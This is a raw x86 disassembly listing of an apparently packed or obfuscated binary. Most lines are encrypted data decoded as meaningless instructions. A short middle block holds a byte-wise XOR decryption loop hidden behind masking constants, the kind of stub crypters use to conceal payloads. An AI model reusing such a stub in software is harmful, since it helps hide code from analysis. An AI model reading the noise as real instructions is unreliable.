  42851b:	retf   0xccf6
  42851e:	repz add eax,ebx
  428521:	sar    ebx,0xe7
  428524:	hlt    
  428525:	(bad)  
  428526:	rcr    dh,0xe1
  428529:	aad    0xfb
  42852b:	add    eax,0xe6e00b0a
  428530:	icebp  
  428531:	scas   eax,DWORD PTR es:[edi]
  428532:	fstp   st(5)
  428534:	shr    al,cl
  428536:	(bad)  
  428537:	mov    cl,0xd3
  428539:	out    0xef,eax
  42853b:	stc    
  42853c:	mov    dh,0xf7
  42853e:	ror    ecx,1
  428540:	(bad)  
  428542:	cmc    
  428543:	lock test DWORD PTR [ebx],0xf600d6d9
  42854a:	add    al,0xd9
  42854c:	add    cl,BYTE PTR [edi]
  42854e:	call   0xc31a6760
  428553:	in     eax,0xcd
  428555:	loopne 0x42850d
  428557:	(bad)  
  428558:	sar    edx,1
  42855a:	stc    
  42855b:	std    
  42855c:	mov    bl,0xdc
  42855e:	in     al,dx
  42855f:	mov    ah,0xff
  428561:	enter  0x6ef,0xda
  428565:	repnz mov esp,0xee901bc
  42856b:	stc    
  42856c:	in     eax,0xdb
  42856e:	(bad)  
  42856f:	cld    
  428570:	ret    0xc6b3
  428573:	in     eax,0xe4
  428575:	sti    
  428576:	jecxz  0x428551
  428578:	mov    dh,0xd5
  42857a:	int3   
  42857b:	enter  0xe4e5,0xe3
  42857f:	sti    
  428580:	mov    ebp,0xc6fdfbba
  428585:	fcomip st,st(2)
  428587:	loopne 0x42856b
  428589:	jmp    0xcac4:0xddf40701
  428590:	fsubp  st(4),st
  428592:	repz jmp 0xf3094854
  428598:	in     al,0xe4
  42859a:	(bad)
  42859d:	int3   
  42859e:	mov    ebx,0xefd8f4ff
  4285a3:	std    
  4285a4:	in     al,0xc7
  4285a6:	in     eax,0xe2
  4285a8:	jmp    0x4285af
  4285aa:	fucomip st,st(5)
  4285ac:	hlt    
  4285ad:	in     eax,0xca
  4285af:	add    bl,ch
  4285b1:	xlat   BYTE PTR ds:[ebx]
  4285b2:	jmp    0xe8ed:0xa9c4ecb6
  4285b9:	out    dx,eax
  4285ba:	jmp    0xf9da:0xcae3dbfe
  4285c1:	(bad)  
  4285c3:	shl    edi,cl
  4285c5:	test   DWORD PTR [edi],0xc9cbdac3
  4285cb:	aad    0xff
  4285cd:	fsin   
  4285cf:	les    edi,FWORD PTR [ecx-0x1c1d183f]
  4285d5:	shr    al,cl
  4285d7:	(bad)  
  4285d9:	loopne 0x4285d9
  4285db:	mov    edx,0xf8bbe8f7
  4285e0:	in     al,dx
  4285e1:	fcmovnu st,st(7)
  4285e3:	sar    dh,cl
  4285e5:	jmp    0x4285c0
  4285e7:	cmc    
  4285e8:	or     dl,dh
  4285ea:	loop   0x4285eb
  4285ec:	hlt    
  4285ed:	fisttp DWORD PTR [ebx]
  4285ef:	in     eax,0xcd
  4285f1:	xlat   BYTE PTR ds:[ebx]
  4285f2:	jecxz  0x4285da
  4285f4:	jmp    0x4285db
  4285f6:	mov    dl,0xf6
  4285f8:	retf   
  4285f9:	out    0xef,eax
  4285fb:	jmp    0xfff6:0xdcf1fef5
  428602:	test   DWORD PTR [ecx],0xc1b9dcd2
  428608:	div    eax
  42860a:	jecxz  0x4285f1
  42860c:	push   cs
  42860d:	hlt    
  42860e:	into   
  42860f:	fild   QWORD PTR [ebx-0x34080819]
  428615:	repnz mov ah,0xf6
  428618:	int    0xd0
  42861a:	in     al,dx
  42861b:	mov    edx,0xfec3dbbe
  428620:	mov    esi,0x5bed4fb
  428625:	aad    0xa
  428627:	in     eax,0xd0
  428629:	or     ah,dh
  42862b:	or     ch,bl
  42862d:	retf   0x50f
  428630:	test   al,0xed
  428632:	out    0xe1,eax
  428634:	mul    dh
  428636:	icebp  
  428637:	(bad)  [ebx+edi*8-0x6132d10]
  42863e:	clc    
  42863f:	mov    edx,0xb406d7be
  428644:	int3   
  428645:	inc    cl
  428647:	pop    es
  428648:	ret    0xe6eb
  42864b:	fimul  DWORD PTR [edx]
  42864d:	ret    0xfee0
  428650:	fdivr  QWORD PTR [esi-0x104a1f24]
  428656:	icebp  
  428657:	mov    cl,0xd8
  428659:	int3   
  42865a:	out    0xfb,eax
  42865c:	(bad)  
  42865d:	jmp    0x1d3:0xd7fad3fc
  428664:	loopne 0x428662
  428666:	ret    0xf5e6
  428669:	inc    BYTE PTR [esi]
  42866b:	(bad)  
  42866d:	or     eax,0xc5af13e0
  428672:	les    ebp,FWORD PTR [ebp-0x2d3b520b]
  428678:	in     al,0xef
  42867a:	jmp    0xd8f95c51
  42867f:	ret    
  428680:	push   edx
  428682:	mov    esi,0xc6e3e3cc
  428687:	or     al,BYTE PTR [eax]
  428689:	jmp    0x428673
  42868b:	(bad)  
  42868d:	retf   
  42868e:	shl    ecx,cl
  428690:	(bad)  
  428691:	scas   eax,DWORD PTR es:[edi]
  428692:	iret   
  428693:	shl    edx,0xc4
  428696:	shl    ah,cl
  428698:	retf   0xf4b2
  42869b:	int    0xd3
  42869d:	mov    ch,0xef
  42869f:	aad    0xbc
  4286a1:	cli    
  4286a2:	repnz int 0x0
  4286a5:	in     eax,0xf0
  4286a7:	add    ebx,edx
  4286a9:	(bad)  
  4286aa:	cli    
  4286ab:	leave  
  4286ac:	leave  
  4286ad:	loope  0x42868b
  4286af:	out    0xe7,al
  4286b1:	shl    edx,0xb3
  4286b4:	repnz test bl,0xcf
  4286b8:	jmp    0xe9f878ab
  4286bd:	retf   
  4286be:	fidivr WORD PTR [esi-0x310a0f3d]
  4286c4:	(bad)  
  4286c5:	jecxz  0x4286c3
  4286c7:	test   BYTE PTR [ecx],0xf7
  4286ca:	cld    
  4286cb:	add    eax,0xcfc9e9e8
  4286d0:	loop   0x428681
  4286d2:	(bad)  
  4286d3:	cmc    
  4286d4:	test   al,0xdb
  4286d7:	(bad)  
  4286d8:	retf   0xdff0
  4286db:	jmp    0xf0e9:0xefb8daf6
  4286e2:	aam    0xe3
  4286e4:	aad    0x3
  4286e6:	add    eax,0xfc06fbf1
  4286eb:	clc    
  4286ec:	(bad)  
  4286ed:	leave  
  4286ee:	enter  0xdcdf,0xb0
  4286f2:	shl    bl,1
  4286f4:	int3   
  4286f5:	loope  0x4286e0
  4286f7:	lds    esi,FWORD PTR [eax-0x5024b2e]
  4286fd:	mov    ecx,0x7edd9f5
  428702:	in     al,dx
  428703:	push   ecx
  428705:	fld    DWORD PTR [ecx]
  428707:	neg    dl
  428709:	cli    
  42870a:	aad    0xe9
  42870c:	std    
  42870d:	iret   
  42870e:	add    ecx,DWORD PTR [ecx]
  428710:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428711:	out    0xdf,eax
  428713:	rcr    ch,1
  428715:	jmp    0xdedf:0xd9f4f4e3
  42871c:	fcmovnbe st,st(3)
  42871e:	fxch   st(6)
  428720:	mov    ebp,0xe1fef7d9
  428725:	cmc    
  428726:	push   eax
  428728:	div    eax
  42872a:	add    eax,0x7cefb0d
  42872f:	jmp    0x428711
  428731:	(bad)
  428734:	mov    cl,0xc3
  428736:	mov    bh,0xe9
  428738:	rol    ch,cl
  42873a:	shr    edx,cl
  42873c:	hlt    
  42873d:	mov    ch,0xb8
  42873f:	int    0xdf
  428741:	loope  0x4286fb
  428743:	stc    
  428744:	rol    DWORD PTR [edi],0x3
  428747:	aam    0xfe
  428749:	add    al,BYTE PTR [eax]
  42874b:	stc    
  42874c:	loope  0x428741
  42874e:	(bad)  
  42874f:	ffreep st(0)
  428751:	xlat   BYTE PTR ds:[ebx]
  428752:	leave  
  428753:	mov    al,0xb1
  428755:	out    dx,al
  428756:	out    dx,eax
  428757:	sti    
  428758:	int3   
  428759:	mov    dh,0xf2
  42875b:	aam    0xfe
  42875d:	jmp    0xd806:0xb8dfe3d7
  428764:	aad    0xd7
  428766:	cli    
  428767:	mov    esp,0xc5c9f9f7
  42876c:	fucomi st,st(0)
  42876e:	enter  0xdfef,0xcb
  428772:	out    0xcf,eax
  428774:	mov    bh,0xed
  428776:	rol    ebp,0xf7
  428779:	test   dl,0xc5
  42877c:	in     al,dx
  42877d:	repz out dx,eax
  42877f:	repz out dx,eax
  428781:	sar    BYTE PTR [esp+ebp*8-0x1a4345],1
  428788:	loopne 0x428771
  42878a:	fcomip st,st(6)
  42878c:	clc    
  42878d:	in     eax,0xb
  42878f:	call   0xae225551
  428794:	mov    esp,0xf2b6fbef
  428799:	scas   al,BYTE PTR es:[edi]
  42879a:	lock fadd st,st(5)
  42879d:	jmp    0x6db:0xd3dab9f1
  4287a4:	bnd jmp 0x428777
  4287a7:	faddp  st(4),st
  4287a9:	fadd   DWORD PTR ds:0xe9e6c6
  4287af:	fdiv   QWORD PTR [ebx-0x3f181f3c]
  4287b5:	rol    bh,0xed
  4287b8:	out    dx,al
  4287b9:	stc    
  4287ba:	(bad)  
  4287bb:	mov    ecx,0xbafdb8b9
  4287c0:	cli    
  4287c1:	idiv   BYTE PTR [esi-0xf0e4042]
  4287c7:	jmp    0xd93e828f
  4287cc:	out    dx,eax
  4287cd:	in     al,dx
  4287ce:	(bad)  
  4287cf:	in     al,0xcc
  4287d1:	lock scas al,BYTE PTR es:[edi]
  4287d3:	call   0xd7f5789c
  4287d8:	leave  
  4287d9:	inc    edi
  4287db:	mov    esi,0xccd5e4d1
  4287e0:	loopne 0x4287bd
  4287e2:	loop   0x4287eb
  4287e4:	hlt    
  4287e5:	mov    esp,0xfac6e2c4
  4287ea:	xlat   BYTE PTR ds:[ebx]
  4287eb:	retf   
  4287ec:	jmp    ebp
  4287ee:	in     eax,0xfe
  4287f0:	mov    esi,0xd7a8bcb8
  4287f5:	mov    al,0xb6
  4287f7:	mov    bh,0xf5
  4287f9:	jmp    0xca3d52d4
  4287fe:	cli    
  4287ff:	add    edi,ebp
  428801:	jecxz  0x4287fd
  428803:	(bad)  
  428804:	shl    ecx,cl
  428806:	in     al,0xd7
  428808:	aam    0x3
  42880a:	add    bl,bh
  42880c:	fcmovnb st,st(6)
  42880e:	loop   0x4287e2
  428810:	jmp    0xcc354fe8
  428815:	retf   0xf7f4
  428818:	jmp    0xbad1:0xb8bff5ee
  42881f:	sar    edi,cl
  428821:	cld    
  428822:	in     eax,dx
  428823:	sti    
  428824:	repz aad 0xe6
  428827:	pop    es
  428828:	add    BYTE PTR ds:0xdd08fcc5,al
  42882e:	or     al,bl
  428830:	mov    ecx,0xc2bcd6e5
  428835:	scas   al,BYTE PTR es:[edi]
  428836:	in     eax,dx
  428837:	stc    
  428838:	shr    ch,cl
  42883a:	out    dx,eax
  42883b:	jmp    0xf1d7:0xf7bff7be
  428842:	fldln2 
  428844:	push   es
  428845:	or     edx,esp
  428847:	hlt    
  428848:	loopne 0x42880b
  42884a:	dec    BYTE PTR [esi]
  42884c:	loope  0x428853
  42884e:	in     al,0xdc
  428850:	rcr    al,0xc1
  428853:	out    dx,al
  428854:	int    0xd1
  428856:	in     al,0xeb
  428858:	fdivr  DWORD PTR [edx-0x53a0f25]
  42885e:	imul   ch
  428860:	jecxz  0x42883f
  428862:	out    dx,eax
  428863:	lock rol DWORD PTR [ecx],1
  428866:	cld    
  428867:	xlat   BYTE PTR ds:[ebx]
  428868:	xlat   BYTE PTR ds:[ebx]
  428869:	(bad)  
  42886b:	out    0xd,eax
  42886d:	aam    0xe0
  42886f:	pop    es
  428870:	ret    
  428871:	out    dx,eax
  428872:	test   al,0xec
  428874:	xlat   BYTE PTR ds:[ebx]
  428875:	call   0xfaf8722c
  42887a:	in     al,0xb4
  42887c:	(bad)  
  42887e:	ror    bh,1
  428880:	(bad)  
  428881:	fdivr  QWORD PTR [esi-0x3e021923]
  428887:	push   es
  428888:	icebp  
  428889:	loope  0x42888e
  42888b:	(bad)  
  42888c:	cld    
  42888d:	clc    
  42888e:	repz (bad) 
  428890:	mov    dl,0xf3
  428892:	loop   0x428881
  428894:	icebp  
  428895:	shl    DWORD PTR [ebp-0xd292e1a],cl
  42889b:	mov    al,0xb3
  42889d:	sar    ah,cl
  42889f:	clc    
  4288a0:	ror    ebp,1
  4288a2:	repz fdivrp st(2),st
  4288a5:	rcl    ah,0xc0
  4288a8:	mov    BYTE PTR [esi],0x7
  4288ab:	add    edi,esp
  4288ad:	fcmovu st,st(0)
  4288af:	adc    DWORD PTR [eax-0x312e4f44],edi
  4288b5:	int3   
  4288b6:	iret   
  4288b7:	call   0xf90d4973
  4288bc:	retf   
  4288bd:	mov    ch,0xd0
  4288bf:	fcom   st(7)
  4288c1:	mov    esi,0xbde0bfc7
  4288c6:	div    al
  4288c8:	or     esi,esi
  4288ca:	in     al,0xc0
  4288cc:	call   0xe71275e0
  4288d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4288d2:	retf   
  4288d3:	lods   eax,DWORD PTR ds:[esi]
  4288d4:	shl    bh,cl
  4288d6:	in     eax,0xc1
  4288d8:	into   
  4288d9:	in     al,dx
  4288da:	fdiv   DWORD PTR [edi+edx*8-0x3701362e]
  4288e1:	cli    
  4288e2:	fadd   st,st(6)
  4288e4:	add    bh,bh
  4288e6:	fsub   st(2),st
  4288e8:	ror    ecx,0x1
  4288eb:	add    edi,ecx
  4288ed:	or     al,0xcd
  4288ef:	(bad)  
  4288f0:	shl    bh,1
  4288f2:	rcl    edi,cl
  4288f4:	in     al,dx
  4288f5:	out    dx,al
  4288f6:	shl    dl,0xc9
  4288f9:	idiv   DWORD PTR [ecx-0x32a203c]
  4288ff:	out    dx,eax
  428900:	ret    
  428901:	out    dx,al
  428902:	(bad)  
  428904:	icebp  
  428905:	mov    edx,0xc6def6c0
  42890a:	cmc    
  42890b:	loope  0x42890e
  42890d:	loope  0x42891e
  42890f:	stc    
  428910:	fsubp  st(5),st
  428912:	jmp    0xf8ce:0xefd5eeee
  428919:	rcl    edx,1
  42891b:	icebp  
  42891c:	retf   0xf5fb
  42891f:	cmc    
  428920:	loopne 0x42890f
  428922:	cld    
  428923:	sti    
  428924:	add    al,0xd2
  428926:	mov    ecx,0xe1d5e9f1
  42892b:	hlt    
  42892c:	(bad)  
  42892e:	add    al,0xf1
  428930:	shr    BYTE PTR [esi-0x48135322],1
  428936:	iret   
  428937:	(bad)  
  428939:	lock call 0xf4f84104
  42893f:	icebp  
  428940:	add    ah,bh
  428942:	shl    esp,0x1
  428945:	ret    
  428946:	add    al,0xe0
  428948:	mov    edi,0xec0bc004
  42894d:	fmul   st(5),st
  42894f:	enter  0xc8e0,0xee
  428953:	enter  0xaaf5,0xf5
  428957:	cmc    
  428958:	repnz enter 0xc6c8,0xd6
  42895d:	retf   0xe3f1
  428960:	iret   
  428961:	cmc    
  428962:	pop    es
  428963:	loop   0x428958
  428965:	stc    
  428966:	cmc    
  428967:	add    esp,ebx
  428969:	out    0xd8,al
  42896b:	fcmovb st,st(5)
  42896d:	jmp    0xcec5:0xc8e9eee9
  428974:	mov    ebp,0xb1acd3f4
  428979:	aad    0xde
  42897b:	(bad)  
  42897c:	mov    edi,0xfbbdf5b9
  428981:	idiv   esi
  428983:	inc    eax
  428985:	(bad)  
  428986:	fild   WORD PTR [ebx]
  428988:	retf   0xee09
  42898b:	std    
  42898c:	or     eax,0xbf06c105
  428991:	loopne 0x428955
  428993:	out    dx,al
  428994:	(bad)  
  428995:	mul    bh
  428997:	fxch   st(5)
  428999:	call   0xec1a5c54
  42899e:	jmp    0x42899b
  4289a0:	icebp  
  4289a1:	out    0xc0,eax
  4289a3:	mov    BYTE PTR [edi],0xf0
  4289a6:	out    0xdd,eax
  4289a8:	loope  0x4289a6
  4289aa:	(bad)  
  4289ac:	(bad)  
  4289ae:	int3   
  4289af:	int3   
  4289b0:	stos   DWORD PTR es:[edi],eax
  4289b1:	jmp    0xcf046068
  4289b6:	(bad)  
  4289b7:	leave  
  4289b8:	cmc    
  4289b9:	(bad)  
  4289ba:	(bad)  
  4289bc:	aam    0xf1
  4289be:	repz mov eax,0xc703cebc
  4289c4:	repnz out 0xeb,eax
  4289c7:	jecxz  0x4289b9
  4289c9:	clc    
  4289ca:	fcmovne st,st(1)
  4289cc:	int    0xf
  4289ce:	adc    edi,edi
  4289d0:	loopne 0x428983
  4289d2:	lock not edx
  4289d5:	sti    
  4289d6:	loop   0x428999
  4289d8:	mov    ecx,0xc8f2f6d3
  4289dd:	iret   
  4289de:	fcmovne st,st(4)
  4289e0:	repnz repnz std 
  4289e3:	not    esi
  4289e5:	(bad)  
  4289e6:	(bad)  
  4289e7:	inc    bh
  4289e9:	add    cl,cl
  4289eb:	add    al,0xdb
  4289ed:	pop    es
  4289ee:	sti    
  4289ef:	or     esp,ebp
  4289f1:	repnz loopne 0x4289a3
  4289f4:	(bad)  
  4289f5:	stos   BYTE PTR es:[edi],al
  4289f6:	(bad)  
  4289f7:	out    0xcd,al
  4289f9:	rcr    bh,1
  4289fb:	mov    edx,0xddeeb8f4
  428a00:	int3   
  428a01:	jecxz  0x428a03
  428a03:	ffree  st(2)
  428a05:	lock shl dl,0xea
  428a09:	test   BYTE PTR [edx],0x5
  428a0c:	(bad)  
  428a0d:	or     edi,esp
  428a0f:	fucom  st(5)
  428a11:	jecxz  0x4289e2
  428a13:	repz mov bl,0xd0
  428a16:	leave  
  428a17:	repnz leave 
  428a19:	shl    DWORD PTR [edx+ecx*8-0x8130525],cl
  428a20:	mov    ecx,0xd9dac3d3
  428a25:	sar    BYTE PTR [ebp-0x23df723],1
  428a2b:	fisttp QWORD PTR [esi]
  428a2d:	or     ch,bh
  428a2f:	psubusb mm1,QWORD PTR [ecx-0x1637b]
  428a36:	dec    DWORD PTR [ebp-0x1777b]
  428a3c:	dec    DWORD PTR [ecx-0x17f7b]
  428a42:	dec    DWORD PTR [ebp-0x15f7b]
  428a48:	dec    DWORD PTR [ecx-0x1737b]
  428a4e:	dec    DWORD PTR [ebx-0x1937b]
  428a54:	(bad)  
  428a55:	cmp    eax,DWORD PTR [ebp-0x164]
  428a5b:	jae    0x428c0b
  428a61:	mov    eax,DWORD PTR [ebp-0x180]
  428a67:	mov    DWORD PTR [eax],0xf89c85a5
  428a6d:	mov    eax,DWORD PTR [ebp-0x174]
  428a73:	mov    DWORD PTR [eax],0xf89c85ae
  428a79:	lea    eax,[ebp-0x185]
  428a7f:	mov    DWORD PTR [ebp-0x18c],eax
  428a85:	mov    eax,DWORD PTR [ebp-0x168]
  428a8b:	xor    eax,0x75108b5
  428a90:	add    eax,0x3272fb
  428a95:	mov    ecx,DWORD PTR [ebp-0x164]
  428a9b:	imul   ecx,eax
  428a9e:	mov    eax,DWORD PTR [ebp-0x18c]
  428aa4:	mov    edx,DWORD PTR [ebp-0x190]
  428aaa:	mov    cl,BYTE PTR [edx+ecx*1]
  428aad:	mov    BYTE PTR [eax],cl
  428aaf:	mov    eax,DWORD PTR [ebp-0x168]
  428ab5:	xor    eax,0x75108b5
  428aba:	add    eax,0x3272fb
  428abf:	mov    ecx,DWORD PTR [ebp-0x164]
  428ac5:	imul   ecx,eax
  428ac8:	mov    eax,DWORD PTR [ebp-0x170]
  428ace:	xor    eax,0x75108b5
  428ad3:	add    eax,DWORD PTR [ebp-0x190]
  428ad9:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fb]
  428ae1:	mov    ecx,DWORD PTR [ebp-0x178]
  428ae7:	xor    ecx,0x75108b5
  428aed:	lea    eax,[eax+ecx*1+0x3272fb]
  428af4:	movzx  ecx,BYTE PTR [ebp-0x185]
  428afb:	xor    ecx,eax
  428afd:	mov    BYTE PTR [ebp-0x185],cl
  428b03:	mov    al,BYTE PTR [ebp-0x185]
  428b09:	mov    ecx,DWORD PTR [ebp-0x168]
  428b0f:	xor    ecx,0x75108b5
  428b15:	add    ecx,0x3272fb
  428b1b:	mov    edx,DWORD PTR [ebp-0x164]
  428b21:	imul   edx,ecx
  428b24:	mov    ecx,DWORD PTR [ebp-0x190]
  428b2a:	mov    BYTE PTR [ecx+edx*1],al
  428b2d:	mov    eax,DWORD PTR [ebp-0x168]
  428b33:	xor    eax,0x75108b5
  428b38:	add    eax,0x3272fb
  428b3d:	mov    ecx,DWORD PTR [ebp-0x164]
  428b43:	imul   ecx,eax
  428b46:	mov    eax,DWORD PTR [ebp-0x18c]
  428b4c:	mov    edx,DWORD PTR [ebp-0x190]
  428b52:	mov    cl,BYTE PTR [edx+ecx*1]
  428b55:	mov    BYTE PTR [eax],cl
  428b57:	mov    eax,DWORD PTR [ebp-0x168]
  428b5d:	xor    eax,0x75108b5
  428b62:	add    eax,0x3272fb
  428b67:	mov    ecx,DWORD PTR [ebp-0x164]
  428b6d:	imul   ecx,eax
  428b70:	mov    eax,DWORD PTR [ebp-0x184]
  428b76:	xor    eax,0x75108b5
  428b7b:	add    eax,DWORD PTR [ebp-0x190]
  428b81:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fb]
  428b89:	mov    ecx,DWORD PTR [ebp-0x160]
  428b8f:	xor    ecx,0x75108b5
  428b95:	lea    eax,[eax+ecx*1+0x3272fb]
  428b9c:	movzx  ecx,BYTE PTR [ebp-0x185]
  428ba3:	xor    ecx,eax
  428ba5:	mov    BYTE PTR [ebp-0x185],cl
  428bab:	mov    al,BYTE PTR [ebp-0x185]
  428bb1:	mov    ecx,DWORD PTR [ebp-0x168]
  428bb7:	xor    ecx,0x75108b5
  428bbd:	add    ecx,0x3272fb
  428bc3:	mov    edx,DWORD PTR [ebp-0x164]
  428bc9:	imul   edx,ecx
  428bcc:	mov    ecx,DWORD PTR [ebp-0x190]
  428bd2:	mov    BYTE PTR [ecx+edx*1],al
  428bd5:	mov    eax,DWORD PTR [ebp-0x184]
  428bdb:	xor    eax,0x75108b5
  428be0:	add    eax,0x3272fb
  428be5:	mov    ecx,DWORD PTR [ebp-0x16c]
  428beb:	xor    ecx,0x75108b5
  428bf1:	add    ecx,0x3272fb
  428bf7:	imul   eax,ecx
  428bfa:	add    eax,DWORD PTR [ebp-0x164]
  428c00:	mov    DWORD PTR [ebp-0x164],eax
  428c06:	jmp    0x428a4f
  428c0b:	mov    eax,DWORD PTR [ebp-0x154]
  428c11:	xor    eax,0x75108b5
  428c16:	mov    ecx,DWORD PTR [ebp-0x17c]
  428c1c:	xor    ecx,0x75108b5
  428c22:	add    ecx,0x3272fb
  428c28:	mov    edx,DWORD PTR [ebp-0x194]
  428c2e:	mov    esi,DWORD PTR [ebp-0x184]
  428c34:	xor    esi,0x75108b5
  428c3a:	add    esi,0x3272fb
  428c40:	imul   esi,edx
  428c43:	or     esi,ecx
  428c45:	lea    eax,[esi+eax*1+0x3272fb]
  428c4c:	mov    ecx,DWORD PTR [ebp-0x154]
  428c52:	xor    ecx,0x75108b5
  428c58:	add    ecx,DWORD PTR [ebp-0x144]
  428c5e:	lea    eax,[ecx+eax*1+0x3272fb]
  428c65:	mov    DWORD PTR [ebp-0x144],eax
  428c6b:	jmp    0x42b034
  428c70:	mov    eax,DWORD PTR [ebp-0x154]
  428c76:	xor    eax,0x75108b5
  428c7b:	mov    ecx,DWORD PTR [ebp-0x144]
  428c81:	lea    eax,[ecx+eax*1+0x3272fb]
  428c88:	jmp    0x42b02e
  428c8d:	scas   eax,DWORD PTR es:[edi]
  428c8e:	in     al,0x37
  428c90:	dec    ebx
  428c91:	je     0x428cdb
  428c93:	mul    DWORD PTR [edx+ebx*1-0x1e]
  428c97:	imul   esi,DWORD PTR [edx-0x541ca9dd],0xfffffffa
  428c9e:	lods   eax,DWORD PTR ds:[esi]
  428c9f:	jns    0x428d1c
  428ca1:	add    bl,BYTE PTR [eax-0x5a288485]
  428ca7:	cmc    
  428ca8:	mov    cl,0xc8
  428caa:	mov    al,0xf6
  428cac:	clc    
  428cad:	mov    ecx,0xcff9fbce
  428cb2:	cmc    
  428cb3:	repz mov eax,0xdfe2f6b8
  428cb9:	clc    
  428cba:	loope  0x428c98
  428cbc:	call   esi
  428cbe:	fcomp  st(6)
  428cc0:	or     edi,ebx
  428cc2:	fiadd  DWORD PTR [edi]
  428cc4:	mov    esi,0xe9e4dce7
  428cc9:	out    0xd5,al
  428ccb:	ret    0xd4b0
  428cce:	(bad)
  428cd1:	std    
  428cd2:	in     eax,dx
  428cd3:	add    ecx,esi
  428cd5:	xlat   BYTE PTR ds:[ebx]
  428cd6:	rol    BYTE PTR ds:0xd8d6d4f4,0xe5
  428cdd:	test   ecx,0xa0fe3c4
  428ce3:	clc    
  428ce4:	lods   al,BYTE PTR ds:[esi]
  428ce5:	ret    0xf3f6
  428ce8:	jmp    0x428ca0
  428cea:	mov    dl,0xc7
  428cec:	in     eax,dx
  428ced:	(bad)  
  428cee:	cmc    
  428cef:	in     al,0xfa
  428cf1:	fdiv   st(5),st
  428cf3:	enter  0xd2f5,0xdb
  428cf7:	loop   0x428ccb
  428cf9:	lds    eax,FWORD PTR [ecx]
  428cfb:	jmp    0x13cf:0xd504d0d5
  428d02:	dec    DWORD PTR [eax]
  428d04:	fnsave [eax-0x3a285013]
  428d0a:	les    esi,FWORD PTR [ebp-0x2f001f25]
  428d10:	bnd call edi
  428d13:	(bad)  
  428d15:	fsub   st,st(1)
  428d17:	ffree  st(6)
  428d19:	loope  0x428cee
  428d1b:	fiadd  WORD PTR [edx]
  428d1d:	(bad)  
  428d1e:	std    
  428d1f:	enter  0xfbd8,0xfb
  428d23:	pop    es
  428d24:	ret    
  428d25:	mov    dl,0xc0
  428d27:	iret   
  428d28:	jecxz  0x428d15
  428d2a:	iret   
  428d2b:	out    dx,eax
  428d2c:	mul    edi
  428d2e:	mov    edx,0xcbbaf1b5
  428d33:	fdivrp st(2),st
  428d35:	fiadd  WORD PTR [eax]
  428d37:	fcom   st(1)
  428d39:	(bad)  
  428d3a:	aad    0x1
  428d3c:	hlt    
  428d3d:	ror    BYTE PTR [ecx],0xef
  428d40:	(bad)
  428d43:	or     al,0xbe
  428d45:	out    dx,eax
  428d46:	(bad)  
  428d47:	retf   0xb4d5
  428d4a:	mov    bh,0xb0
  428d4c:	repnz out 0xf5,eax
  428d4f:	out    0xfb,al
  428d51:	into   
  428d52:	mov    ebp,0xf3d0d3f6
  428d57:	loopne 0x428d2e
  428d59:	rcr    al,cl
  428d5b:	jmp    0x9047125
  428d60:	ret    
  428d61:	or     esp,ebp
  428d63:	add    ah,al
  428d65:	scas   eax,DWORD PTR es:[edi]
  428d66:	lock into 
  428d68:	out    dx,al
  428d69:	(bad)  
  428d6a:	repnz retf 
  428d6c:	lock fmul st,st(3)
  428d6f:	in     al,dx
  428d70:	fcmove st,st(1)
  428d72:	jmp    0x428d67
  428d74:	mov    bh,0xdd
  428d76:	mul    bl
  428d78:	(bad)  
  428d7a:	(bad)  
  428d7b:	in     eax,0xe6
  428d7d:	call   0xb4c925a
  428d82:	fadd   QWORD PTR [esi]
  428d84:	in     eax,0xe5
  428d86:	mov    edi,0xd3eaf1b3
  428d8b:	shl    bh,0xef
  428d8e:	(bad)  
  428d8f:	mov    esi,0xfecbced3
  428d94:	icebp  
  428d95:	cli    
  428d96:	out    0x3,al
  428d98:	add    dl,bl
  428d9a:	aam    0xc6
  428d9c:	neg    bl
  428d9e:	cld    
  428d9f:	mov    esp,0xcaec05ec
  428da4:	in     eax,dx
  428da5:	retf   
  428da6:	out    0xcc,al
  428da8:	lock int3 
  428daa:	(bad)  
  428dab:	fnstenv [edx-0x130f3215]
  428db1:	test   esp,0xffd101fd
  428db7:	in     eax,dx
  428db8:	mov    ebp,0x3cbe5be
  428dbd:	rcr    ebp,0xfe
  428dc0:	add    al,bl
  428dc2:	iret   
  428dc3:	adc    dh,cl
  428dc5:	loop   0x428d84
  428dc7:	into   
  428dc8:	jmp    0x428dab
  428dca:	jmp    0xedcb:0xfecdd2f0
  428dd1:	(bad)  
  428dd2:	aam    0xc8
  428dd4:	add    eax,DWORD PTR [eax]
  428dd6:	inc    DWORD PTR [esi]
  428dd8:	std    
  428dd9:	mov    ebp,0xdaf9def8
  428dde:	(bad)  
  428ddf:	mov    esp,0xe50ff8c4
  428de4:	test   eax,0xf0e5f1bc
  428de9:	(bad)
  428dec:	(bad)  
  428ded:	fcom   st(0)
  428def:	(bad)  
  428df0:	jmp    0xbdb9:0xf3c8eed2
  428df7:	add    eax,0x7f0e3d4
  428dfc:	retf   0xead9
  428dff:	add    eax,ebp
  428e01:	int    0xf8
  428e03:	retf   
  428e04:	mov    ebp,0xf4efe8f2
  428e09:	mov    dh,0xb3
  428e0b:	(bad)  
  428e0c:	mov    cl,0xe9
  428e0e:	into   
  428e0f:	ror    ebx,cl
  428e11:	mov    dl,0xcf
  428e13:	(bad)  
  428e14:	icebp  
  428e15:	div    dh
  428e17:	mov    eax,0xdae6d3be
  428e1c:	in     eax,0xd4
  428e1e:	dec    bh
  428e20:	enter  0xc9e0,0xf2
  428e24:	mov    dl,0xb8
  428e26:	in     al,0xd1
  428e28:	loope  0x428ddd
  428e2a:	leave  
  428e2b:	out    0xc5,al
  428e2d:	call   0xe4f75a07
  428e32:	out    dx,eax
  428e33:	neg    cl
  428e35:	xlat   BYTE PTR ds:[ebx]
  428e36:	fadd   QWORD PTR [ecx]
  428e38:	in     al,0xbe
  428e3a:	(bad)  
  428e3b:	in     eax,0xe8
  428e3d:	leave  
  428e3e:	or     edi,ebp
  428e40:	(bad)  
  428e41:	out    dx,eax
  428e42:	push   es
  428e43:	repz test al,0xbd
  428e46:	into   
  428e47:	mov    cl,0xed
  428e49:	jmp    0x428e46
  428e4b:	mov    edx,0xf3d4dbea
  428e50:	cld    
  428e51:	repz into 
  428e53:	ror    cl,cl
  428e55:	sar    DWORD PTR [esi-0x342409ff],1
  428e5b:	hlt    
  428e5c:	(bad)
  428e5f:	out    0xf5,al
  428e61:	add    ecx,ebp
  428e63:	add    BYTE PTR [ebp-0x1b4c0f15],bh
  428e69:	mov    cl,0xfa
  428e6b:	jmp    0xd3158025
